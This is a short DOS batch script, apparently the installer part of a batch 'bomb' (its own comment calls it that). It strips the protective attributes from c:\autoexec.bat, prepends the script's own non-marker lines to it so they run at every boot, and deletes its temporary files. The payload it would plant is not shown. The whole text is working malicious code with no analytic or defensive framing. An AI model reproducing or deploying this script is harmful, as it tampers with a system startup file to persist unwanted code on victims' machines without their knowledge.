@echo off %inst%
rem bomb hbbginst
type %0 |find /V "inst"  >c:\inst.cfg
attrib c:\autoexec.bat -h -r -s %inst%
type c:\autoexec.bat >c:\hbbginst.cfg 
copy /B c:\inst.cfg+c:\hbbginst.cfg c:\autoexec.bat >nul
del c:\hbbginst.cfg >nul 
del c:\inst.cfg >nul
goto end %inst%
